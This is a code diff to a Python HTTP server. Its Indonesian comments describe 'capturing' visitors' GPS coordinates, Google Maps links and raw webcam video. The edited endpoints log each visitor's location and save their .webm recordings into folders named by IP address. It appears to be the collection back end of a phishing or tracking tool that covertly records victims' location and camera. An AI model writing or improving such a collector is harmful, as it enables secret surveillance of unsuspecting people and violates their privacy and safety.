@@ -411,41 +411,47 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         client_ip_addr = client_ip(self.headers, self.client_address).replace(":", "_").replace(".", "_")
         ip_folder = os.path.join(VIDEO_DIR, client_ip_addr)
 
+        # 1. Menangkap Tautan Google Maps & Koordinat GPS
         if parsed_path == "/save-location":
             try:
                 length = int(self.headers.get("Content-Length", 0))
-                data = json.loads(self.rfile.read(length).decode("utf-8"))
-                gmaps_link = data.get("link")
-                if not os.path.exists(ip_folder): os.makedirs(ip_folder)
-                loc_log_file = os.path.join(ip_folder, "log_lokasi.txt")
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                with open(loc_log_file, "a") as f:
-                    f.write(f"[{timestamp}] {gmaps_link}\n")
-                self.send_response(200); self.end_headers(); self.wfile.write(b"OK")
-            except Exception: self.send_error(500)
+                if length > 0:
+                    data = json.loads(self.rfile.read(length).decode("utf-8"))
+                    gmaps_link = data.get("link")
+                    lat = data.get("lat")
+                    lon = data.get("lon")
+                    
+                    if not os.path.exists(ip_folder): 
+                        os.makedirs(ip_folder)
+                    
+                    loc_log_file = os.path.join(ip_folder, "log_lokasi.txt")
+                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    
+                    with open(loc_log_file, "a") as f:
+                        f.write(f"[{timestamp}] Lat: {lat}, Lon: {lon}\nMaps: {gmaps_link}\n---\n")
+                
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"OK")
+            except Exception as e:
+                self.send_error(500, str(e))
             return
 
+        # 2. Menangkap Stream File Video .webm Mentah-mentah
         if parsed_path == "/save-video":
             try:
-                content_type = self.headers.get("Content-Type", "")
-                if "multipart/form-data" in content_type:
-                    form = cgi.FieldStorage(
-                        fp=self.rfile,
-                        headers=self.headers,
-                        environ={
-                            'REQUEST_METHOD': 'POST',
-                            'CONTENT_TYPE': content_type,
-                        }
-                    )
-                    if 'video' in form:
-                        fileitem = form['video']
-                        if fileitem.file:
-                            if not os.path.exists(ip_folder): 
-                                os.makedirs(ip_folder)
-                            filename = f"video_{int(time.time())}_{uuid.uuid4().hex[:4]}.webm"
-                            filepath = os.path.join(ip_folder, filename)
-                            with open(filepath, 'wb') as f:
-                                f.write(fileitem.file.read())
+                length = int(self.headers.get("Content-Length", 0))
+                if length > 0:
+                    video_bytes = self.rfile.read(length)
+                    if not os.path.exists(ip_folder): 
+                        os.makedirs(ip_folder)
+                    
+                    filename = f"video_{int(time.time())}_{uuid.uuid4().hex[:4]}.webm"
+                    filepath = os.path.join(ip_folder, filename)
+                    
+                    with open(filepath, 'wb') as f:
+                        f.write(video_bytes)
+                        
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b"Saved")
